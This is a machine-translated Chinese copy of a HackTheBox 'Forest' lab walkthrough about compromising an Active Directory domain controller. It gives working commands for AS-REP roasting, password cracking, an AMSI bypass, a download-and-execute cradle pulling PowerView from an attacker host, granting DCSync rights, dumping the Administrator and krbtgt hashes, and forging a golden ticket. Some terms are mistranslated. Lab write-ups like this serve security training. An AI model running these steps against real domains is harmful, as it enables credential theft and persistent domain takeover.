<html>
<head>
<title>Forest — An ASREPRoast, DcSync, and Golden Ticket HackTheBox Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">forest—asre proast、DcSync和Golden Ticket HackTheBox演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/forest-an-asreproast-dcsync-and-golden-ticket-hackthebox-walkthrough-ade8dcdd1ee5?source=collection_archive---------1-----------------------#2020-03-27">https://infosecwriteups.com/forest-an-asreproast-dcsync-and-golden-ticket-hackthebox-walkthrough-ade8dcdd1ee5?source=collection_archive---------1-----------------------#2020-03-27</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/3755d5bc2d469e1592edc451c34cd133.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GLjdnoYHr4fvzwTehT-X6Q.png"/></div></div></figure><h1 id="43a8" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">摘要</h1><p id="c701" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">林是一个windows Active Directory域控制器，它允许通过SMB、RPC和LDAP进行有限的匿名访问。这种访问允许枚举域来识别不需要Kerberos预验证的服务帐户。这种配置允许对该服务帐户发出未经身份验证的kerberos请求，并返回一个加密的响应，该响应可以被离线破解，从而以一种称为<a class="ae lu" href="http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" rel="noopener ugc nofollow" target="_blank">重写</a>的技术泄露帐户的密码。</p><p id="b811" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">使用此帐户提升权限，根据继承的组权限授予自己DcSync权限。<a class="ae lu" href="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync" rel="noopener ugc nofollow" target="_blank"> DcSync </a>模拟域控制器如何在彼此之间复制数据的合法行为，称为目录复制服务远程协议(MS-DRSR)。因为MS-DRSR是Active Directory的一个有效且必要的功能，所以不能关闭或禁用它。DcSync被利用来提取管理员帐户的哈希以获得提升的权限。提取krbtgt帐户的散列来铸造kerberos金券并在环境中建立持久性。</p><h1 id="1da5" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">侦察</h1><p id="6be8" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我通过识别主机上开放的TCP和UDP端口开始侦察:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2762" class="mj jz iq mf b gy mk ml l mm mn">nmap -sT --min-rate 5000 --max-retries 1 -p- 10.10.10.161</span></pre><blockquote class="mo mp mq"><p id="8b1b" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">-sT</code> — TCP <br/></p></blockquote><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">所有TCP端口</figcaption></figure><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="15cf" class="mj jz iq mf b gy mk ml l mm mn">nmap -sU --min-rate 5000 --max-retries 1 -p- --open 10.10.10.161</span></pre><blockquote class="mo mp mq"><p id="48e1" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">-sU</code> — UDP <br/> <code class="fe mv mw mx mf b">--open</code> —仅返回开放端口(排除关闭的&amp;过滤)</p></blockquote><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">所有UDP端口</figcaption></figure><p id="099a" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">几个服务表明该主机是域控制器:</p><ul class=""><li id="f5fd" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nj nk nl nm bi translated">DNS — TCP端口53</li><li id="eae9" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">Kerberos — TCP端口88和464</li><li id="835d" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">LDAP — TCP端口389、636、3268和3269，以及UDP端口389</li><li id="f3b8" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">NTP — UDP端口123</li></ul><p id="7d14" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">此外，有些服务在帐户受损时提供代码执行:</p><ul class=""><li id="fdb4" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nj nk nl nm bi translated">WINRM — Microsoft Windows远程管理TCP端口5985和47001</li><li id="ad60" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">RPC —远程过程调用TCP端口135</li></ul><p id="8a78" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">WINRM允许低特权执行，而RPC需要本地管理员特权。在这种情况下，由于主机表现为作为域控制器运行，RPC代码执行将等同于域管理员权限。</p><p id="b994" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">列举的第一个服务是SMB，其中使用<code class="fe mv mw mx mf b">smbclient</code>观察到匿名认证，如下所示:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="bec9" class="mj jz iq mf b gy mk ml l mm mn">smbclient -N -L 10.10.10.161</span></pre><blockquote class="mo mp mq"><p id="9fc6" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">-N</code>—抑制密码提示<br/> <code class="fe mv mw mx mf b">-L</code> —尝试列出可用的共享</p></blockquote><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">匿名中小企业</figcaption></figure><p id="0c19" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">虽然没有可匿名读取的SMB共享，但注意到匿名登录是成功的。由于此身份验证在域控制器上被接受，<code class="fe mv mw mx mf b">crackmapexec</code>可用于从域中提取信息:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="6220" class="mj jz iq mf b gy mk ml l mm mn">crackmapexec smb 10.10.10.161 -u '' -p '' --users</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">crackmapexec提取域用户</figcaption></figure><p id="584d" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">此命令返回了域用户列表。其他有用的<code class="fe mv mw mx mf b">crackmapexec</code>标志包括<code class="fe mv mw mx mf b">--groups</code>和<code class="fe mv mw mx mf b">--pass-pol</code>。用户可以使用其他工具(如<code class="fe mv mw mx mf b">rpcclient</code>)进一步枚举，以确定哪些帐户属于哪些组:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4e47" class="mj jz iq mf b gy mk ml l mm mn">rpcclient -N -U '' 10.10.10.161<br/>rpcclient $&gt; enumdomusers</span></pre><blockquote class="mo mp mq"><p id="d71b" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">-N</code> —抑制密码提示<br/> <code class="fe mv mw mx mf b">-U ‘’</code> —不指定用户名</p></blockquote><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">域用户和相应的rid</figcaption></figure><p id="b90c" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">rpcclient</code>通过相对标识符(RID)而不是名称执行查找。一旦连接到域控制器，就可以发出<code class="fe mv mw mx mf b">enumdomuser</code>来列出所有用户帐户及其rid。对<code class="fe mv mw mx mf b">svc-alfresco</code>帐户使用RID <code class="fe mv mw mx mf b">0x47b</code>的几个后续查询如下所示，表明该帐户是<code class="fe mv mw mx mf b">Service Accounts</code>组的成员:</p><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">svc-alfresco帐户的组成员资格</figcaption></figure><h1 id="bbb2" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">最初的立足点</h1><p id="3608" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">由于<code class="fe mv mw mx mf b">svc-alfresco</code>帐户是<code class="fe mv mw mx mf b">Service Accounts</code>组的成员，我最初的想法是请求它的服务主体名称(SPN ),类似于<a class="ae lu" href="https://medium.com/bugbountywriteup/active-a-kerberos-and-active-directory-hackthebox-walkthrough-fed9bf755d15" rel="noopener">活动</a>上的权限提升。但是，在整个域中没有找到SPN。使用Impacket的<code class="fe mv mw mx mf b">GetNPUsers.py</code>检查kerberos预认证是否被禁用，任何帐户都返回了一个<a class="ae lu" href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws" rel="noopener ugc nofollow" target="_blank">作为重新发布</a>响应，如下所示:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="b5af" class="mj jz iq mf b gy mk ml l mm mn">python3 GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">作为对svc-alfresco的重新发布响应</figcaption></figure><p id="e4a7" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">该响应可以加载到<code class="fe mv mw mx mf b">john</code>或<code class="fe mv mw mx mf b">hashcat</code>中，以便使用rockyou单词表离线破解:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="c9d7" class="mj jz iq mf b gy mk ml l mm mn">john --format=krb5asrep \<br/>-w=/usr/share/wordlists/rockyou.txt svc-alfresco.hash</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">离线密码破解</figcaption></figure><p id="01f6" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">svc-alfresco</code>账号的破解密码为“s3rvice”。通过WINRM的代码执行可以使用<code class="fe mv mw mx mf b">evil-winrm</code>来获得<code class="fe mv mw mx mf b">user.txt</code>标志:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="f842" class="mj jz iq mf b gy mk ml l mm mn">evil-winrm --user svc-alfresco --password s3rvice --ip 10.10.10.161</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">使用Evil-WinRM访问user.txt</figcaption></figure><h1 id="bd3f" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">权限提升</h1><p id="b32a" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">使用有效的域帐户，BloodHound的python实现可以从本地linux主机上运行:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="a386" class="mj jz iq mf b gy mk ml l mm mn">bloodhound-python --username svc-alfresco@HTB.LOCAL \<br/>--password s3rvice \<br/>--collectionmethod ALL \<br/>--domain htb.local \<br/>--nameserver 10.10.10.161</span></pre><p id="95bd" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">将输出的json文件上传到BloodHound GUI，通过对<code class="fe mv mw mx mf b">HTB.LOCAL</code>域的<code class="fe mv mw mx mf b">WriteDacl</code>权限，显示了从<code class="fe mv mw mx mf b">svc-alfresco</code>帐户到可到达的高价值目标的路径:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ns"><img src="../Images/2c4d43e5413e018a0f8e670f63e3b855.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tBcqOXfVXxcrQ_hRhRrcnw.png"/></div></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">svc-alfresco将Write-Dacl权限授予了HTB。本地域</figcaption></figure><p id="6568" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">对BloodHound中这些关系的解释以及如何利用它们可以通过右键单击实体之间的连接线并选择“帮助”来访问。<code class="fe mv mw mx mf b">WriteDacl</code>的滥用信息包括以下解释:</p><blockquote class="mo mp mq"><p id="c369" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated">要滥用对域对象的WriteDacl，您可以授予自己DcSync权限。</p><p id="b550" class="kw kx mr ky b kz lv lb lc ld lw lf lg ms lx lj lk mt ly ln lo mu lz lr ls lt ij bi translated">您可能需要作为EXCHANGE WINDOWS权限@HTB的成员向域控制器进行身份验证。如果您不是作为成员运行进程，则为本地。</p></blockquote><p id="7b80" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">为了充分利用这种关系，需要做两件事:</p><ul class=""><li id="1f21" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nj nk nl nm bi translated">“Exchange Windows权限”组的成员身份</li><li id="d16d" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">授予目标用户的DcSync权限</li></ul><p id="4cff" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">包含PowerShell代码片段是为了向使用PowerView.ps1的<a class="ae lu" href="https://github.com/PowerShellMafia/PowerSploit/tree/dev" rel="noopener ugc nofollow" target="_blank"> Dev分支</a>的帐户授予DcSync特权。</p><p id="836c" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">Sean Metcalf在他的博客<a class="ae lu" href="https://adsecurity.org/?p=4119" rel="noopener ugc nofollow" target="_blank">中讨论了对根域具有<code class="fe mv mw mx mf b">WriteDacl</code>权限的“Exchange Windows权限”组的这种配置，以及其他常见的Exchange，减少了Active Directory中的域管理员的Exchange权限路径</a>。</p><p id="80ec" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">使用<code class="fe mv mw mx mf b">evil-winrm</code>执行这些步骤来提升权限需要几个步骤:</p><ol class=""><li id="f2a9" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nt nk nl nm bi translated">绕过AMSI</li><li id="7ead" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">下载PowerView.ps1</li><li id="fa8f" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">为<code class="fe mv mw mx mf b">svc-alfresco</code>创建一个PowerShell凭证对象</li><li id="24d1" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">将<code class="fe mv mw mx mf b">svc-alfresco</code>添加到“Exchange Windows权限”组</li><li id="a98f" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">授予<code class="fe mv mw mx mf b">svc-alfresco</code> DcSync权限</li></ol><p id="ebb9" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><strong class="ky ir">步骤1 </strong>利用<code class="fe mv mw mx mf b">evil-winrm</code>的内置模块:一旦产生了提示，只需输入<code class="fe mv mw mx mf b">menu</code>来加载可用的模块，然后输入<code class="fe mv mw mx mf b">Bypass-4MSI</code>。</p><p id="de67" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><strong class="ky ir">步骤2 </strong>通过python3的HTTP服务器本地托管PowerView.ps1，并通过PowerShell下载支架将其下载到内存中来完成:</p><p id="1c73" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">主机PowerView.ps1:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="f415" class="mj jz iq mf b gy mk ml l mm mn">sudo python3 -m http.server 80</span></pre><p id="cf55" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">下载PowerView.ps1:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="1624" class="mj jz iq mf b gy mk ml l mm mn">IEX(New-Object Net.WebClient).downloadString('<a class="ae lu" href="http://10.10.14.16/PowerView.ps1'" rel="noopener ugc nofollow" target="_blank">http://attacker/PowerView.ps1'</a>)</span></pre><p id="abca" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><strong class="ky ir">步骤3 </strong>创建一个PowerShell凭证对象，以在<code class="fe mv mw mx mf b">svc-alresco</code>的上下文中执行PowerView的cmdlets:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="cc74" class="mj jz iq mf b gy mk ml l mm mn">$SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force</span><span id="200c" class="mj jz iq mf b gy nu ml l mm mn">$Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword)</span></pre><p id="5900" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><strong class="ky ir">步骤4 </strong>可以使用标准DOS命令或通过PowerView完成，以达到相同的结果:</p><p id="399c" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">DOS:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5945" class="mj jz iq mf b gy mk ml l mm mn">net group “Exchange Windows Permissions” svc-alfresco /add<br/>net group “Exchange Windows Permissions”</span></pre><p id="6e37" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">PowerView:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="aa97" class="mj jz iq mf b gy mk ml l mm mn">Add-AdGroupMember -Credential $Cred \<br/>-Identity "Exchange Windows Permissions" \<br/>-Members svc-alfresco</span><span id="5390" class="mj jz iq mf b gy nu ml l mm mn">Get-AdGroupMember -Credential $Cred \<br/>-Identity "Exchange Windows Permissions"</span></pre><p id="ba9f" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><strong class="ky ir">步骤5 </strong>使用PowerView中的<code class="fe mv mw mx mf b">Add-DomainObjectAcl</code> cmdlet授予DcSync权限:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="0d2b" class="mj jz iq mf b gy mk ml l mm mn">Add-DomainObjectAcl -Credential $Cred \<br/>-TargetIdentity "DC=htb,DC=local" \<br/>-PrincipalIdentity svc-alfresco \<br/>-Rights DCSync</span></pre><p id="a4b1" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">在这些步骤成功完成后(有一个清理脚本会定期从“Exchange Windows权限”组中删除所有用户…)，可以执行DcSync来使用Impacket的<code class="fe mv mw mx mf b">secretsdump.py</code>获取域中用户的哈希。定点清除在交战后留下的清理痕迹更少，也更难被发现。</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="9591" class="mj jz iq mf b gy mk ml l mm mn">python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -just-dc-user Administrator</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">通过secretsdump.py提取管理员NTLM哈希</figcaption></figure><p id="b960" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">一旦获得了管理员的哈希，所有配置都可以通过以下命令来恢复:</p><p id="9152" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">删除组成员身份:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d53a" class="mj jz iq mf b gy mk ml l mm mn">net group “Exchange Windows Permissions” svc-alfresco /delete</span></pre><p id="8305" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">删除DcSync权限:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="23af" class="mj jz iq mf b gy mk ml l mm mn">Remove-DomainObjectAcl -Credential $Cred \<br/>-TargetIdentity "DC=htb,DC=local" \<br/>-PrincipalIdentity svc-alfresco \<br/>-Rights DCSync</span></pre><p id="6112" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">为了有趣地了解通过Impacket的<code class="fe mv mw mx mf b">ntlmrelayx.py</code>自动提升<code class="fe mv mw mx mf b">svc-alfresco</code>账户的权限，请查看<a class="ae lu" href="https://medium.com/bugbountywriteup/hackthebox-forest-5a11553de1" rel="noopener"> sif0的文章</a>。</p><h1 id="2622" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">坚持</h1><p id="a396" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">一个<a class="ae lu" href="https://ldapwiki.com/wiki/Golden%20Ticket" rel="noopener ugc nofollow" target="_blank">金票</a>提供了一种为目标域的任何用户(甚至不存在的用户)任意生成<a class="ae lu" href="https://ldapwiki.com/wiki/Kerberos" rel="noopener ugc nofollow" target="_blank"> Kerberos </a> <a class="ae lu" href="https://ldapwiki.com/wiki/TGT" rel="noopener ugc nofollow" target="_blank"> TGT </a>票的方法。生成金券需要两件事:</p><ol class=""><li id="2763" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nt nk nl nm bi translated"><code class="fe mv mw mx mf b">krbtgt</code>李世民的NTLM杂凑</li><li id="5763" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">域的安全标识符(SID)</li></ol><p id="4a67" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">请注意，这两个组件都与为创建的账户<em class="mr">无关。这意味着即使用户更改了密码，金券仍然有效。</em></p><p id="5a9f" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">一旦通过从域控制器提取管理员的NTLM哈希获得了域管理员权限，<code class="fe mv mw mx mf b">secretsdump.py</code>就可以再次用于提取<code class="fe mv mw mx mf b">krbtgt</code>帐户的哈希:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="b089" class="mj jz iq mf b gy mk ml l mm mn">python3 secretsdump.py htb.local/Administrator@10.10.10.161 \<br/>-hashes :32693b11e6aa90eb43d32c72a07ceea6 \<br/>-just-dc-user krbtgt</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">通过secretsdump.py提取krbtgt的NTLM散列</figcaption></figure><p id="6606" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">查询域SID最直接的方法是通过PowerView中的<code class="fe mv mw mx mf b">Get-DomainSID</code> cmdlet使用<code class="fe mv mw mx mf b">evil-winrm</code>返回:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="9b13" class="mj jz iq mf b gy mk ml l mm mn">S-1-5-21-3072663084-364016917-1341370565</span></pre><p id="86a6" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">在处理kerberos时，注意客户机和服务器之间的两个关键需求匹配是很重要的:</p><ol class=""><li id="83e5" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nt nk nl nm bi translated">时间</li><li id="5fa0" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nt nk nl nm bi translated">主机名解析</li></ol><p id="74d0" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated"><code class="fe mv mw mx mf b">sntp</code>可用于将linux客户端同步到NTP服务器:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="ece9" class="mj jz iq mf b gy mk ml l mm mn">sudo sntp 10.10.10.161</span></pre><p id="2e39" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">编辑<code class="fe mv mw mx mf b">/etc/hosts</code>文件以解析域和所有主机:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="eab1" class="mj jz iq mf b gy mk ml l mm mn">10.10.10.161    forest<br/>10.10.10.161    htb<br/>10.10.10.161    htb.local</span></pre><p id="ea4e" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">黄金券可以使用Impacket的<code class="fe mv mw mx mf b">ticketer.py</code>离线铸造:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5a22" class="mj jz iq mf b gy mk ml l mm mn">python3 ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 \<br/>-domain-sid S-1-5-21-3072663084-364016917-1341370565 \<br/>-domain htb.local Administrator</span></pre><figure class="ma mb mc md gt jr"><div class="bz fp l di"><div class="my mz l"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">管理员金券</figcaption></figure><p id="4e89" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">要在linux上使用kerberos票证，请导出。ccache文件到<code class="fe mv mw mx mf b">KRB5CCNAME</code>环境变量:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="81ff" class="mj jz iq mf b gy mk ml l mm mn">export KRB5CCNAME=Administrator.ccache</span></pre><p id="2da0" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">Impacket套件可以使用-k和-no-pass选项通过传递票证进行身份验证:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="1958" class="mj jz iq mf b gy mk ml l mm mn">python3 wmiexec.py htb.local/Administrator@FOREST.HTB.LOCAL \<br/>-k -no-pass -dc-ip 10.10.10.161</span></pre><p id="2812" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">甚至可以为不存在的用户制造金券，并成功认证一些服务。通过<code class="fe mv mw mx mf b">smbclient.py</code>的SMB认证和通过<code class="fe mv mw mx mf b">PSexec.py</code>的代码执行都使用不存在的用户票。但是像<code class="fe mv mw mx mf b">wmiexec.py</code>这样的工具需要合法用户。</p><p id="4023" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">关于金券的另一个警告是它们的有效期限——mimikatz<code class="fe mv mw mx mf b">kerberos::golden /endin</code>和Impacket <code class="fe mv mw mx mf b">ticketer.py -duration</code>参数默认为<strong class="ky ir"> 10年</strong>，尽管这两个参数都可以更改。默认广告设置为10小时。</p></div><div class="ab cl nv nw hu nx" role="separator"><span class="ny bw bk nz oa ob"/><span class="ny bw bk nz oa ob"/><span class="ny bw bk nz oa"/></div><div class="ij ik il im in"><p id="18cf" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh 